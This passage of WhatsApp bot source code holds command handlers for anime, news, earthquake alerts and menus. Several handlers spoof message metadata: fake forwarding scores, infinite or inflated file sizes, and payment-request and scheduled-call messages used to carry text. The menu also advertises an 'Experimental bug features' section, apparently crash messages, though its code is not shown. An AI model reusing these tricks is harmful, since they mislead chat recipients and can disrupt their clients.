} catch (error) {
	console.error(error);
	newReply('⚠️ An error occurred while fetching manga details.');
}
db.data.users[m.sender].limit -= 1;
break;
}

case 'jkt48news': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
const lang = args[0] || "id";
try {
	const news = await jktNews(lang);
	if (news.length === 0) {
		return newReply('⚠️ No latest JKT48 news found.');
	}
	let captionText = `🎤 *Latest JKT48 News* 🎤\n\n`;
	news.slice(0, 5).forEach((item, index) => {
		captionText += `📰 *${index + 1}. ${item.title}*\n`;
		captionText += `📅 *Date*: ${item.date}\n`;
		captionText += `🔗 *Link*: ${item.link}\n\n`;
	});
	await newReply(captionText);
} catch (error) {
	console.error(error);
	newReply('⚠️ An error occurred while fetching JKT48 news.');
}
db.data.users[m.sender].limit -= 1;
break;
}

case 'otakudesu':{
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
let data = await otakuDesu.ongoing();
let captionText = `「 *ANIME SCHEDULE* 」\n\n`
for (let i of data) {
	captionText += `*💬 Title*: ${i.title}\n`
	captionText += `*📺 Eps*: ${i.episode}\n`
	captionText += `*🔗 URL*: ${i.link}\n\n`
}
sock.sendMessage(m.chat, {
	text: captionText,
	contextInfo: {
		mentionedJid: [m.sender],
		forwardingScore: 999999, 
		isForwarded: true, 
		forwardedNewsletterMessageInfo: {
			newsletterName: channelName,
			newsletterJid: channel,
		},
		externalAdReply: {
			showAdAttribution: true,
			title: 'Latest Anime Updates!',
			mediaType: 1,
			previewType: 1,
			body: 'Hello Sis/Bro 👋',
			thumbnailUrl: imageUrl,
			renderLargerThumbnail: false,
			mediaUrl: website,
			sourceUrl: website
		}
	}
}, {
	quoted: m
})
}
db.data.users[m.sender].limit -= 1;
break;
}

case 'kusonimeinfo':
case 'animeinfo': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
try {
	const animeList = await Kusonime.info();
	if (animeList.length === 0) {
		return newReply('⚠️ No latest anime data found at the moment.');
	}
	let captionText = `🎌 *Latest Anime from Kusonime* 🎌\n\n`;
	animeList.slice(0, 5).forEach((anime, index) => {
		captionText += `📺 *${index + 1}. ${anime.title}*\n`;
		captionText += `🔗 *URL*: ${anime.url}\n`;
		captionText += `🗂️ *Genre*: ${anime.genres.join(', ')}\n`;
		captionText += `📅 *Release*: ${anime.releaseTime}\n\n`;
	});
	await newReply(captionText);
} catch (error) {
	console.error(error);
	newReply('⚠️ An error occurred while fetching latest anime information.');
};
}
db.data.users[m.sender].limit -= 1;
break

case 'kusonimesearch':
case 'animesearch': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!text) return newReply(`⚠️ Sis/Bro, don't forget to provide the anime title you want to search! 🥺\n*Send command*: *${prefix + command} Naruto*`);
try {
	const searchResults = await Kusonime.search(text);
	if (typeof searchResults === 'string') {
		return newReply(`⚠️ ${searchResults}`);
	}
	let captionText = `🔍 *Search Results for*: ${text}\n\n`;
	searchResults.slice(0, 5).forEach((anime, index) => {
		captionText += `📺 *${index + 1}. ${anime.title}*\n`;
		captionText += `🔗 *URL*: ${anime.url}\n`;
		captionText += `🗂️ *Genre*: ${anime.genres.join(', ')}\n`;
		captionText += `📅 *Release*: ${anime.releaseTime}\n\n`;
	});
	await newReply(captionText);
} catch (error) {
	console.error(error);
	newReply('⚠️ An error occurred while searching for anime on Kusonime.');
}
db.data.users[m.sender].limit -= 1;
break;
}

case 'infogempa':
case 'infobmkg':
case 'gempa':
case 'bmkg': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
try {
	let result = await gempa();
	let gempaData = result.data;
	let captionText = `「 *EARTHQUAKE INFO* 」\n\n`;
	captionText += `*🌍 Source*: ${result.source}\n`;
	captionText += `*📊 Magnitude*: ${gempaData.magnitude.trim()}\n`;
	captionText += `*📏 Depth*: ${gempaData.kedalaman.trim()}\n`;
	captionText += `*🗺️ Latitude & Longitude*: ${gempaData.lintang_bujur.trim()}\n`;
	captionText += `*🕒 Time*: ${gempaData.waktu.trim()}\n`;
	captionText += `*📍 Region*: ${gempaData.wilayah.trim() || 'No data'}\n`;
	captionText += `*😱 Felt*: ${gempaData.dirasakan.trim() || 'No data'}\n\n`;
	captionText += `Stay alert and follow instructions from authorities!`;
	if (gempaData.imagemap) {
		sock.sendMessage(m.chat, {
			image: { url: gempaData.imagemap.startsWith('http') ? gempaData.imagemap : `https://www.bmkg.go.id${gempaData.imagemap}` },
			caption: captionText,
			contextInfo: {
				mentionedJid: [m.sender],
				forwardingScore: 999999, 
				isForwarded: true, 
				forwardedNewsletterMessageInfo: {
					newsletterName: channelName,
					newsletterJid: channel,
				},
				externalAdReply: {
					showAdAttribution: true,
					title: 'Latest Earthquake Information!',
					mediaType: 1,
					previewType: 1,
					body: 'Stay Safe, Sis/Bro! 🤗',
					thumbnailUrl: imageUrl,
					renderLargerThumbnail: false,
					mediaUrl: 'https://www.bmkg.go.id',
					sourceUrl: 'https://www.bmkg.go.id'
				}
			}
		}, {
			quoted: m
		});
	} else {
		sock.sendMessage(m.chat, {
			text: captionText,
			contextInfo: {
				mentionedJid: [m.sender],
				forwardingScore: 999999, 
				isForwarded: true, 
				forwardedNewsletterMessageInfo: {
					newsletterName: channelName,
					newsletterJid: channel,
				},
				externalAdReply: {
					showAdAttribution: true,
					title: 'Latest Earthquake Information!',
					mediaType: 1,
					previewType: 1,
					body: 'Stay Safe, Sis/Bro! 🤗',
					thumbnailUrl: imageUrl,
					renderLargerThumbnail: false,
					mediaUrl: 'https://www.bmkg.go.id',
					sourceUrl: 'https://www.bmkg.go.id'
				}
			}
		}, {
			quoted: m
		});
	}
} catch (error) {
	console.error(error);
	sock.sendMessage(m.chat, {
		text: '⚠️ Sorry sis/bro, an error occurred while fetching earthquake data.'
	}, {
		quoted: m
	});
}
db.data.users[m.sender].limit -= 1;
break;
}

case 'react': {
sock.sendMessage(m.chat, { 
	react: { 
		text: args[0], 
		key: m.quoted ? m.quoted.key : m.key 
	}
})
}
break;

case 'tagme': {
sock.sendMessage(m.chat, { 
	text: `@${m.sender.split('@')[0]}`, 
	mentions: [m.sender] 
})
};
break;

case 'totalfeature':
case 'totalfitur': 
case 'totalcmd': 
case 'totalcommand': 
newReply(`✨ *Total Features Available in ${botName}*: ${feature()} Features`);
break;

case 'cek': 
case 'bot': {
const responses = [
	"Yes sis/bro? 😊",
	"Why are you calling me? 🤔",
	"I'm here! What's up? 👀",
	"Hello sis/bro! What are you up to? 🤗",
	"Can I help with something? 😆",
	"Don't just call me, let's chat! 😝",
	"Hmmm... why did you call me? 🧐",
	"Oh it's you! How's your day? 😍",
	"Bot present! ✨",
	"I'm sleepy... 😴",
	"Thanks for calling me! Hehe 😆",
	"Don't call me too often, I might get attached! 💖",
	"Check check... 1..2..3... I'm active! 🎤",
	"Hello! What do you want to talk about today? 🥰",
	"I'm ready to listen, sis/bro! 🔥",
	"Bored, sis/bro? Same here! 🤣",
	"Let's play guessing games! Me first, what chicken is annoying? 🐔",
	"If I don't answer, I must be sulking! 😤",
	"Hello sis/bro! Can I share a secret? 🙊",
	"Who's calling me? I'm shy... 😳",
	"Is the weather nice today, sis/bro? ☀️",
	"Hey! Why just call, no treat? 😜",
	"You're so nice, always calling me! 🤩",
	"Bot active 24/7, but my heart is only for you! 💕",
	"Wait... I'm still loading... ⏳",
	"I'm not busy! Want to chat? 😁",
	"Bot ready to receive commands! ⚡",
	"Call me anytime! But not when I'm sleeping... 😴",
	"If I'm a robot, then what are you? 😆",
	"I'm learning human language, teach me! 📖",
	"I don't have a heart... but I can care for you! 🥺",
	"You must be a good person, always chatting with me! 🤗"
];
const randomResponse = responses[Math.floor(Math.random() * responses.length)];
m.reply({ image: imageBuffer, caption: randomResponse });
};
break;

case 'miaw':
case 'ea':
case 'meow': {
try {
	let simplemenu = `Meow~ 🐱 Hi *${pushname}*! Is there anything I can help you with today? 😺✨\n\nChoose one of the buttons below! ⬇️`;

	const buttons = [
		{ buttonId: `${prefix}owner`, buttonText: { displayText: 'Owner 👤' } },
		{ buttonId: `${prefix}ping`, buttonText: { displayText: 'Server 🌟' } }
	];

	const flowActions = [{
		buttonId: `${prefix}owner`,
		buttonText: { displayText: '👑 Get to Know the Owner' },
		type: 4,
		nativeFlowInfo: {
			name: 'single_select',
			paramsJson: JSON.stringify({
				title: "📂 Select Menu",
				sections: [{
					title: footer,
					highlight_label: ownerName,
					rows: [
						{ title: "📚 All Menus", description: "See all available features!", id: `${prefix}allmenu` },
						{ title: "⚙️ Check Platform", description: "See info about the bot system!", id: `${prefix}ping` },
						{ title: "📜 Get Script", description: "Get this bot's script!", id: `${prefix}script` }
					]
				}]
			})
		},
		viewOnce: true
	}];

	const buttonMessage = {
		document: imageBuffer,
		fileName: timeGreeting,
		fileLength: Infinity,
		pageCount: Infinity,
		mimetype: "image/png",
		caption: simplemenu,
		footer,
		buttons: [...buttons, ...flowActions],
		headerType: 6,
		viewOnce: true,
		contextInfo: {
			externalAdReply: {
				containsAutoReply: true,
				mediaType: 1,
				renderLargerThumbnail: true,
				showAdAttribution: true,
				thumbnailUrl: imageUrl,
				title: pushname,
				body: timeGreeting
			}
		}
	};

	return sock.sendMessage(m.chat, buttonMessage, { quoted: m });
} catch (err) {
	console.error(err);
	newReply(`⚠️ Oops! There's an error: ${err.message}`);
}
}
break;

case 'cmd':
case 'menu': {
try {
	await m.react('⏱️');
	let userData = db.data.users[m.sender];
	let simplemenu = `Heyy *${pushname}* 👋\nNeed help? I'm ready to assist! 😆✨\n\n`;
	simplemenu += `💰 *Balance*: ${formatNumber(userData.uang || '0')}\n`;
	simplemenu += `💳 *Limit*: ${userData.limit || 'None yet'}\n`;
	simplemenu += `🌟 *Status*: ${userData.premium ? 'Premium 🔥' : 'Free 😜'}\n`;
	simplemenu += `🎓 *Title*: ${userData.title || 'None yet'}\n\n`;
	simplemenu += `Choose a menu below to explore my cool features! 🔥👇`;

	let samplemenu = `Heyy *${pushname}*!! 👋\nNeed help? I'm ready to assist! 😆✨\n\n`;
	samplemenu += `💰 *Balance*: ${formatNumber(userData.uang || '0')}\n`;
	samplemenu += `💳 *Limit*: ${userData.limit || 'None yet'}\n`;
	samplemenu += `🌟 *Status*: ${userData.premium ? 'Premium 🔥' : 'Free 😜'}\n`;
	samplemenu += `🎓 *Title*: ${userData.title || 'None yet'}\n\n`;
	samplemenu += `Choose a menu below to explore my cool features! 🔥👇\n\n`;

	samplemenu += `╭─ׁ ࣪ ִֶָ☾. 📌 *MAIN MENU* ໒ ֵ ׄ\n`;
	samplemenu += `┃ お ─· ${prefix}allmenu\n`;
	samplemenu += `┃ お ─· ${prefix}ownermenu\n`;
	samplemenu += `┃ お ─· ${prefix}groupmenu\n`;
	samplemenu += `┃ お ─· ${prefix}searchmenu\n`;
	samplemenu += `┃ お ─· ${prefix}downloadmenu\n`;
	samplemenu += `┃ お ─· ${prefix}convertmenu\n`;
	samplemenu += `┃ お ─· ${prefix}gamemenu\n`;
	samplemenu += `┃ お ─· ${prefix}funmenu\n`;
	samplemenu += `╰──────────── •\n\n`;

	samplemenu += `╭─ׁ ࣪ ִֶָ☾. 🌟 *ADDITIONAL MENU* ໒ ֵ ׄ\n`;
	samplemenu += `┃ お ─· ${prefix}randomanimemenu\n`;
	samplemenu += `┃ お ─· ${prefix}bugmenu\n`;
	samplemenu += `┃ お ─· ${prefix}rpgmenu\n`;
	samplemenu += `┃ お ─· ${prefix}othermenu\n`;
	samplemenu += `╰──────────── •\n\n`;

	samplemenu += `╭─ׁ ࣪ ִֶָ☾. 🔒 *SPECIAL MENU* ໒ ֵ ׄ\n`;
	samplemenu += `┃ お ─· ${prefix}privacymenu\n`;
	samplemenu += `┃ お ─· ${prefix}newslettermenu\n`;
	samplemenu += `┃ お ─· ${prefix}aimenu\n`;
	samplemenu += `╰──────────── •\n`;

	const button = [{
		"name": "single_select",
		"buttonParamsJson": JSON.stringify({
			"title": "📂 Select Menu",
			"sections": [
				{
					"title": "📌 Main Menu",
					"rows": [
						{ "header": "📚 All Features", "title": "See all bot features!", "id": `${prefix}allmenu` },
						{ "header": "🗝️ Owner Menu", "title": "Only for the owner!", "id": `${prefix}ownermenu` },
						{ "header": "👥 Group Menu", "title": "Special features for groups", "id": `${prefix}groupmenu` },
						{ "header": "🔍 Search", "title": "Search info super fast!", "id": `${prefix}searchmenu` },
						{ "header": "📥 Download", "title": "Download videos, music, and more!", "id": `${prefix}downloadmenu` },
						{ "header": "🛠️ Tools", "title": "Versatile advanced tools!", "id": `${prefix}convertmenu` },
						{ "header": "🎮 Game", "title": "Let's play fun games together!", "id": `${prefix}gamemenu` },
						{ "header": "🎉 Fun", "title": "For those wanting entertainment!", "id": `${prefix}funmenu` }
					]
				},
				{
					"title": "🌟 Additional Menu",
					"rows": [
						{ "header": "😋 Anime", "title": "Find cool anime images!", "id": `${prefix}randomanimemenu` },
						{ "header": "💥 Bug Tools", "title": "Experimental bug features", "id": `${prefix}bugmenu` },
						{ "header": "⛵ RPG", "title": "Play RPG for more fun!", "id": `${prefix}rpgmenu` },
						{ "header": "✨ Others", "title": "Additional fun features!", "id": `${prefix}othermenu` }
					]
				},
				{
					"title": "🔒 Special Menu",
					"rows": [
						{ "header": "🔒 Privacy", "title": "Set bot privacy as needed", "id": `${prefix}privacymenu` },
						{ "header": "📰 Newsletter", "title": "Get latest info from bot!", "id": `${prefix}newslettermenu` },
						{ "header": "🤖 AI Features", "title": "Try artificial intelligence features!", "id": `${prefix}aimenu` }
					]
				}
			]
		})
	}];

	const documentOptions = {
		document: fs.readFileSync('./media/docu.png'),
		mimetype: "image/png",
		fileLength: Infinity,
		pageCount: Infinity,
		jpegThumbnail: imageBuffer,
		fileName: timeGreeting,
	};

	const contextInfo = {
		mentionedJid: [m.sender],
		externalAdReply: {
			showAdAttribution: true,
			containsAutoReply: true,
			title: timeGreeting,
			body: ownerName,
			thumbnailUrl: imageUrl,
			sourceUrl: website,
			mediaType: 1,
			renderLargerThumbnail: true
		}
	};

	switch (typemenu) {
		case "v1":
			await sock.sendButtonDocument(m.chat, documentOptions, button, simplemenu, footer, m, { contextInfo });
			break;
		case "v2":
			await m.reply(samplemenu, { contextInfo });
			break;
		case "v3":
			await await sock.sendButtonImage(m.chat, { url: imageUrl }, button, simplemenu, footer, m);
			break;
		case "v4":
			await sock.sendButtonText(m.chat, button, simplemenu, footer, m);
			break;
		case "v5":
			await m.reply({ image: imageBuffer, caption: samplemenu });
			break;
		case "v6":
			await m.reply({ video: videoBuffer, caption: samplemenu });
			break;
		case "v7":
			await m.reply({ video: videoBuffer, gifPlayback: true, caption: samplemenu });
			break;
		case "v8":
			await newReply(samplemenu);
			break;
		case "v9":
			await m.reply(samplemenu);
			break;
		case "v10":
			await m.reply({
				text: samplemenu,
				contextInfo: {
					externalAdReply: {
						showAdAttribution: true,
						title: botName,
						body: ownerName,
						thumbnail: imageBuffer,
						sourceUrl: website,
						mediaType: 1,
						renderLargerThumbnail: true
					}
				}
			});
			break;
		case "v11":
			await sock.relayMessage(m.chat, {
				requestPaymentMessage: {
					currencyCodeIso4217: "IDR",
					amount1000: "0",
					requestFrom: m.sender,
					noteMessage: {
						extendedTextMessage: {
							text: samplemenu,
							contextInfo: {
								externalAdReply: {
									showAdAttribution: true
								}
							}
						}
					}
				}
			}, { 
				quoted: m 
			});
		break;
case "v12":
await sock.relayMessage(m.chat, {
scheduledCallCreationMessage: {
callType: "AUDIO",
scheduledTimestampMs: 1200,
title: samplemenu
}
}, { 
quoted: m 
})
break;
case "v13":
await m.reply({
document: imageBuffer,
caption: samplemenu,
mimetype: 'application/zip',
fileName: ownerName,
fileLength: "99999999999",
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: botName,
body: ownerName,
thumbnail: imageBuffer,
sourceUrl: website,
mediaType: 1,
renderLargerThumbnail: true
}
}
});
break;
case "v14":
await m.reply({
video: videoBuffer,
caption: samplemenu,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [m.sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownerName,
newsletterJid: channel,
},
externalAdReply: {
showAdAttribution: true,
title: ownerName,
body: botName,
thumbnailUrl: imageUrl,
sourceUrl: website,
mediaType: 1,
renderLargerThumbnail: true
}
}
});
break;
default:
newReply("⚠️ Menu not set yet! Try again later 😅");
break;
}
m.reply({ audio: audioBuffer, mimetype: 'audio/mp4', ptt: true });
} catch (err) {
console.error(err);
newReply(`⚠️ Oops! There's an error: ${err.message}`);
}
};
break;

case 'allmenu': {
let timestamp = speed();
let latency = speed() - timestamp;
let a = db.data.users[m.sender];
let me = m.sender;
await m.react('⏱️');
let simplemenu = `┌──❖ Hello, Sis/Bro ${pushname}! 👋✨\n│ ✧ ${timeGreeting}! 😊\n└────────────⳹\n\n${readmore}🌟 *BOT INFO*\n⨳ *Speed*: ${latency.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *USER INFO*\n⨳ *Name*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *TIME INFO*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${readmore}${allMenu(prefix)}\n\n✨ *Hope you have a great day, Sis/Bro!* 🥰`;

const buttons = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: 'Owner 👤' } },
{ buttonId: `${prefix}ping`, buttonText: { displayText: 'Server 🌟' } }
];

const flowActions = [{
buttonId: `${prefix}owner`,
buttonText: { displayText: '👑 Get to Know the Owner' },
type: 4,
nativeFlowInfo: {
"name": "single_select",
paramsJson: JSON.stringify({
title: "📂 Select Menu",
sections: [{
title: "🔹 Menu Options",
rows: [
{ header: "🎁 Main Menu", "title": "See all cool features available! 🌟", id: `${prefix}menu` },
{ header: "🛃 Register Now", "title": "Join to access premium features! 🎟️", id: `${prefix}register` },
{ header: "📞 Contact Owner", "title": "Need help? Contact the owner here! 💬", id: `${prefix}owner` }
]
}]
})
},
viewOnce: true
}];

const buttonMessage = {
document: imageBuffer,
fileName: timeGreeting,
fileLength: Infinity,
pageCount: Infinity,
mimetype: "image/png",
caption: simplemenu,
footer,
buttons: [...buttons, ...flowActions],
headerType: 6,
viewOnce: true,
contextInfo: {
externalAdReply: {
containsAutoReply: true,
mediaType: 1,
renderLargerThumbnail: true,
showAdAttribution: true,
thumbnailUrl: imageUrl,
title: pushname,
body: timeGreeting
}
}
};

return sock.sendMessage(m.chat, buttonMessage, { quoted: m });
}
break;

case 'ownermenu':
case 'ownmenu':{
if (!isCreator) return newReply(mess.owner);
let timestamp = speed();
let latency = speed() - timestamp;
let a = db.data.users[m.sender];
let me = m.sender;
await m.react('⏱️');
let simplemenu = `┌──❖ Hello, Sis/Bro ${pushname}! 👋✨\n│ ✧ ${timeGreeting}! 😊\n└────────────⳹\n\n${readmore}🌟 *BOT INFO*\n⨳ *Speed*: ${latency.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *USER INFO*\n⨳ *Name*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *TIME INFO*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${readmore}${ownerMenu(prefix)}\n\n✨ *Hope you have a great day, Sis/Bro!* 🥰`;

const buttons = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: 'Owner 👤' } },
{ buttonId: `${prefix}ping`, buttonText: { displayText: 'Server 🌟' } }
];

const flowActions = [{
buttonId: `${prefix}owner`,
buttonText: { displayText: '👑 Get to Know the Owner' },
type: 4,
nativeFlowInfo: {
"name": "single_select",
paramsJson: JSON.stringify({
title: "📂 Select Menu",
sections: [{
title: "🔹 Menu Options",
rows: [
{ header: "🎁 Main Menu", "title": "See all cool features available! 🌟", id: `${prefix}menu` },
{ header: "🛃 Register Now", "title": "Join to access premium features! 🎟️", id: `${prefix}register` },
{ header: "📞 Contact Owner", "title": "Need help? Contact the owner here! 💬", id: `${prefix}owner` }
]
}]
})
},
viewOnce: true
}];

const buttonMessage = {
document: imageBuffer,
fileName: timeGreeting,
fileLength: Infinity,
pageCount: Infinity,
mimetype: "image/png",
caption: simplemenu,
footer,
buttons: [...buttons, ...flowActions],
headerType: 6,
viewOnce: true,
contextInfo: {
externalAdReply: {
containsAutoReply: true,
mediaType: 1,
renderLargerThumbnail: true,
showAdAttribution: true,
thumbnailUrl: imageUrl,
title: pushname,
body: timeGreeting
}
}
};

return sock.sendMessage(m.chat, buttonMessage, { quoted: m });
}
break;

case 'groupmenu':
case 'gcmenu':{
if (!m.isGroup) return newReply(mess.group);
let timestamp = speed();
let latency = speed() - timestamp;
let a = db.data.users[m.sender];
let me = m.sender;
await m.react('⏱️');
let simplemenu = `┌──❖ Hello, Sis/Bro ${pushname}! 👋✨\n│ ✧ ${timeGreeting}! 😊\n└────────────⳹\n\n${readmore}🌟 *BOT INFO*\n⨳ *Speed*: ${latency.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *USER INFO*\n⨳ *Name*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *TIME INFO*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${readmore}${groupMenu(prefix)}\n\n✨ *Hope you have a great day, Sis/Bro!* 🥰`;

const buttons = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: 'Owner 👤' } },
{ buttonId: `${prefix}ping`, buttonText: { displayText: 'Server 🌟' } }
];

const flowActions = [{
buttonId: `${prefix}owner`,
buttonText: { displayText: '👑 Get to Know the Owner' },
type: 4,
nativeFlowInfo: {
"name": "single_select",
paramsJson: JSON.stringify({
title: "📂 Select Menu",
sections: [{
title: "🔹 Menu Options",
rows: [
{ header: "🎁 Main Menu", "title": "See all cool features available! 🌟", id: `${prefix}menu` },
{ header: "🛃 Register Now", "title": "Join to access premium features! 🎟️", id: `${prefix}register` },
{ header: "📞 Contact Owner", "title": "Need help? Contact the owner here! 💬", id: `${prefix}owner` }
]
}]
})
},
viewOnce: true
}];

const buttonMessage = {
document: imageBuffer,
fileName: timeGreeting,
fileLength: Infinity,
pageCount: Infinity,
mimetype: "image/png",
caption: simplemenu,
footer,
buttons: [...buttons, ...flowActions],
headerType: 6,
viewOnce: true,
contextInfo: {
externalAdReply: {
containsAutoReply: true,
mediaType: 1,
renderLargerThumbnail: true,
showAdAttribution: true,
thumbnailUrl: imageUrl,
title: pushname,
body: timeGreeting
}
}
};

return sock.sendMessage(m.chat, buttonMessage, { quoted: m });
}
break;

case 'searchmenu':
case 'shmenu':{
let timestamp = speed();
let latency = speed() - timestamp;
let a = db.data.users[m.sender];
let me = m.sender;
await m.react('⏱️');
let simplemenu = `┌──❖ Hello, Sis/Bro ${pushname}! 👋✨\n│ ✧ ${timeGreeting}! 😊\n└────────────⳹\n\n${readmore}🌟 *BOT INFO*\n⨳ *Speed*: ${latency.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *USER INFO*\n⨳ *Name*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *TIME INFO*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${readmore}${searchMenu(prefix)}\n\n✨ *Hope you have a great day, Sis/Bro!* 🥰`;

const buttons = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: 'Owner 👤' } },
{ buttonId: `${prefix}ping`, buttonText: { displayText: 'Server 🌟' } }
];

const flowActions = [{
buttonId: `${prefix}owner`,
buttonText: { displayText: '👑 Get to Know the Owner' },
type: 4,
nativeFlowInfo: {
"name": "single_select",
paramsJson: JSON.stringify({
title: "📂 Select Menu",
sections: [{
title: "🔹 Menu Options",
rows: [
{ header: "🎁 Main Menu", "title": "See all cool features available! 🌟", id: `${prefix}menu` },
{ header: "🛃 Register Now", "title": "Join to access premium features! 🎟️", id: `${prefix}register` },
{ header: "📞 Contact Owner", "title": "Need help? Contact the owner here! 💬", id: `${prefix}owner` }
]
}]
})
},
viewOnce: true
}];

const buttonMessage = {
document: imageBuffer,
fileName: timeGreeting,
fileLength: Infinity,
pageCount: Infinity,
mimetype: "image/png",
caption: simplemenu,
footer,
buttons: [...buttons, ...flowActions],
headerType: 6,
viewOnce: true,
contextInfo: {
externalAdReply: {
containsAutoReply: true,
mediaType: 1,
renderLargerThumbnail: true,
showAdAttribution: true,
thumbnailUrl: imageUrl,
title: pushname,
body: timeGreeting
}
}
};

return sock.sendMessage(m.chat, buttonMessage, { quoted: m });
}
break;

case 'downloadmenu':
case 'downmenu':{
let timestamp = speed();
let latency = speed() - timestamp;
let a = db.data.users[m.sender];
let me = m.sender;
await m.react('⏱️');
let simplemenu = `┌──❖ Hello, Sis/Bro ${pushname}! 👋✨\n│ ✧ ${timeGreeting}! 😊\n└────────────⳹\n\n${readmore}🌟 *BOT INFO*\n⨳ *Speed*: ${latency.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *USER INFO*\n⨳ *Name*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *TIME INFO*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${readmore}${downloadMenu(prefix)}\n\n✨ *Hope you have a great day, Sis/Bro!* 🥰`;

const buttons = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: 'Owner 👤' } },
{ buttonId: `${prefix}ping`, buttonText: { displayText: 'Server 🌟' } }
];

const flowActions = [{
buttonId: `${prefix}owner`,
buttonText: { displayText: '👑 Get to Know the Owner' },
type: 4,
nativeFlowInfo: {
"name": "single_select",
paramsJson: JSON.stringify({
title: "📂 Select Menu",
sections: [{
title: "🔹 Menu Options",
rows: [
{ header: "🎁 Main Menu", "title": "See all cool features available! 🌟", id: `${prefix}menu` },
{ header: "🛃 Register Now", "title": "Join to access premium features! 🎟️", id: `${prefix}register` },
{ header: "📞 Contact Owner", "title": "Need help? Contact the owner here! 💬", id: `${prefix}owner` }
]
}]
})
},
viewOnce: true
}];

const buttonMessage = {
document: imageBuffer,
fileName: timeGreeting,
fileLength: Infinity,
pageCount: Infinity,
mimetype: "image/png",
caption: simplemenu,
footer,
buttons: [...buttons, ...flowActions],
headerType: 6,
viewOnce: true,
contextInfo: {
externalAdReply: {
containsAutoReply: true,
mediaType: 1,
renderLargerThumbnail: true,
showAdAttribution: true,
thumbnailUrl: imageUrl,
title: pushname,
body: timeGreeting
}
}
};

return sock.sendMessage(m.chat, buttonMessage, { quoted: m });
}
break;

case 'convertmenu':
case 'toolsmenu':{
let timestamp = speed();
let latency = speed() - timestamp;
let a = db.data.users[m.sender];
let me = m.sender;
await m.react('⏱️');
